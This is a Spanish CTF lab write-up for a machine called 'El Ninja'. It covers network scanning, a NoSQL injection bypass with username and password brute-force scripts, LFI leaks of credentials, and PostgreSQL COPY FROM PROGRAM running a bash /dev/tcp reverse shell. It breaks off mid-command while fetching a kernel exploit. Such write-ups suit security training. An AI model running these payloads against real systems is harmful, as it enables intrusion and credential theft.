# 🥷 El Ninja - Writeup Completo

![Banner](https://img.shields.io/badge/Dificultad-Media-yellow) ![Status](https://img.shields.io/badge/Estado-Completado-brightgreen) ![Root](https://img.shields.io/badge/Root-Obtenido-red)

---

## 🔍 **Connectivity — Initial Host Discovering**

```bash
❯ sudo arp-scan --local
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.91.x   00:50:56:c0:00:08       (Unknown)
192.168.91.x    00:50:56:e9:2d:8d       (Unknown)
192.168.91.208  00:0c:29:5d:b9:16       (Unknown)
192.168.91.x  00:50:56:e8:b2:a8       (Unknown)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.946 seconds (131.55 hosts/sec). 4 responded
```

Tenemos la IP: **192.168.91.208** 🎯

---

## 📡 **ICMP — Verificación de conectividad**

```bash
┌──(kali㉿kali)-[~]
└─$ ping -c2 192.168.91.208
PING 192.168.91.208 (192.168.91.208) 56(84) bytes of data.
64 bytes from 192.168.91.208: icmp_seq=1 ttl=64 time=0.265 ms
64 bytes from 192.168.91.208: icmp_seq=2 ttl=64 time=0.228 ms

--- 192.168.91.208 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1011ms
rtt min/avg/max/mdev = 0.228/0.246/0.265/0.018 ms
```

✅ **TTL=64** → Sistema **Linux**

---

## 🚪 **Port Scan TCP**

```bash
❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 192.168.91.208
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-28 14:43 CEST
Nmap scan report for 192.168.91.208
Host is up (0.00073s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1337/tcp open  waste
5000/tcp open  upnp
5432/tcp open  postgresql
9999/tcp open  abyss
MAC Address: 00:0C:29:5D:B9:16 (VMware)
```

### **Enumeración de servicios**

```bash
❯ nmap -p22,80,1337,5000,5432,9999 -sCV 192.168.91.208
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-28 15:46 CEST
Nmap scan report for 192.168.91.208
Host is up (0.00032s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.2p1 Debian 2+deb12u3
80/tcp   open  http       nginx 1.22.1
1337/tcp open  http       Uvicorn
5000/tcp open  http       Werkzeug httpd 3.1.8 (Python 3.11.2)
5432/tcp open  postgresql PostgreSQL DB (Spanish)
9999/tcp open  abyss?
```

---

## 📡 **Port Scan UDP**

```bash
❯ nmap -sU -p 53,123,161,500,514,520,623,1434,1900,4500,49152 192.168.91.208
PORT      STATE         SERVICE
53/udp    open|filtered domain
161/udp   open          snmp
```

### **SNMP — Información filtrada**

```bash
❯ snmpwalk -v2c -c public 192.168.91.208
iso.3.6.1.2.1.1.4.0 = STRING: "Header: X-Api-Key"
iso.3.6.1.2.1.1.6.0 = STRING: "Endpoint: /api/v1/internal/search"
```

🔑 Descubrimos un **endpoint interno** y un **header de autenticación**.

---

## 🌐 **Port 5000 — Web THL Ninjas**

```bash
❯ ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \
       -u http://192.168.91.208:5000/FUZZ \
       -e .php,.html,.js,.txt,.md,.py -fs 17334

about        [Status: 200]
login        [Status: 200]
services     [Status: 200]
report       [Status: 200]
logout       [Status: 302]
dashboard    [Status: 302]
```

---

## 🔐 **Port 9999 — NoSQL Injection (pymongo)**

### **Bypass de autenticación**

```bash
❯ nc 192.168.91.208 9999
[+] Username: wvverez
[+] Password: ' || '1'=='1

[+] Login Successful
```

### **Extracción de usuarios — Script**

```bash
#!/bin/bash
H=192.168.91.208; P=9999; D=/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
cat "$D" | while read u; do
 printf "\r[+] Probando: %-30s" "$u"
 echo -e "wvverez\n' || this.username == '$u' && '1'=='1\n" | nc $H $P 2>/dev/null | grep -q "Successful" && echo -e "\n[+] ENCONTRADO: $u"
done; echo ""
```

```bash
❯ bash users.sh
[+] Probando: jerry                         
[+] ENCONTRADO: jerry
```

### **Extracción de contraseña — Script**

```bash
#!/bin/bash
H=192.168.91.208; P=9999; U="jerry"; PASS=""
CHARS="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz$%!&"
echo "[+] Extrayendo password para: $U"
for i in {0..30}; do
 for c in $(echo $CHARS | grep -o .); do
  printf "\r[+] Probando posición %d: %s%s    " $i "$PASS" "$c"
  R=$(echo -e "wvverez\n' || (this.username == '$U' && this.password[$i] == '$c') && '1'=='1\n" | nc $H $P 2>/dev/null)
  if echo "$R" | grep -q "Successful"; then PASS="${PASS}${c}"; echo ""; break; fi
 done
done
echo -e "\n[+] Password: $PASS"
```

```bash
❯ bash pass.sh
[+] Password: Meg4SUp3rPassw$%!dthl
```

---

## 🔑 **API Auth — Acceso a datos internos**

```bash
❯ curl -sX GET 'http://192.168.91.208:1337/api/v1/internal/search?q=' \
       -H 'X-Api-Key: jerry:Meg4SUp3rPassw$%!dthl' | jq
```

```json
{
  "results": [
    { "username": "harry", "password": "th3THLninj4p4sss3%cret!", "role": "user" },
    { "username": "wvverez", "password": "4lBus_P3rc1v4l!Wulf", "role": "user" },
    { "username": "loxy", "password": "Gr4ng3r_Bk$M4g1c!", "role": "user" },
    { "username": "d4re", "password": "W34sl3y!Fr3ckl3s#99", "role": "user" },
    { "username": "ninxa", "password": "Slyth3r1n_M4lf0y$", "role": "user" },
    { "username": "pepe", "password": "S3v3rus!P0t10ns#D4rk", "role": "user" },
    { "username": "luis", "password": "Bl4ckD0g_4zkab4n!", "role": "user" },
    { "username": "lenam", "password": "H3Wh0Must!N0t%B3Nam3d", "role": "userx" }
  ]
}
```

✅ **harry:th3THLninj4p4sss3%cret!** funciona en el login.

---

## 📂 **LFI — Local File Inclusion**

En el dashboard, parámetro `?list=` permite leer archivos del sistema:

```bash
?list=../../home/wvverez/app.py
?list=../../home/wvverez/config.py
?list=../../home/wvverez/db.json
```

### **config.py — Secret Key expuesta**

```python
SECRET_KEY = "thl_n1nj4_s3cr3t_k3y_2024_x9z"
FILES_BASE = "/"
```

### **db.json — Credenciales PostgreSQL**

```json
{
  "database": {
    "engine": "postgresql",
    "name": "thlninjas_internal",
    "username": "superadmin",
    "password": "THLDKJNABDdhadasdada11111edd0"
  }
}
```

---

## 🐘 **RCE via PostgreSQL SuperUser**

```bash
❯ psql -h 192.168.91.208 -U superadmin -d thlninjas_internal
thlninjas_internal=# \du
                              Listado de roles
 Nombre de rol |                         Atributos                          
---------------+------------------------------------------------------------
 postgres      | Superusuario, Crear rol, Crear BD, Replicación, Ignora RLS
 superadmin    | Superusuario
```

### **Reverse Shell**

```sql
thlninjas_internal=# CREATE TABLE cmd_tbl(cmd_output TEXT);
thlninjas_internal=# COPY cmd_tbl FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/192.168.91.191/4444 0>&1"';
```

```bash
❯ nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.91.191] from (UNKNOWN) [192.168.91.208] 54968
postgres@debian:/var/lib/postgresql/15/main$
```

---

## 🚀 **CVE-2026-31431 — Escalada a Root**

```bash
postgres@debian:/var/lib/postgresql/15/main$ uname -a
Linux debian 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64 GNU/Linux
```

```bash
postgres@debian:/var/lib/postgresql/15/main$ curl -s https://raw
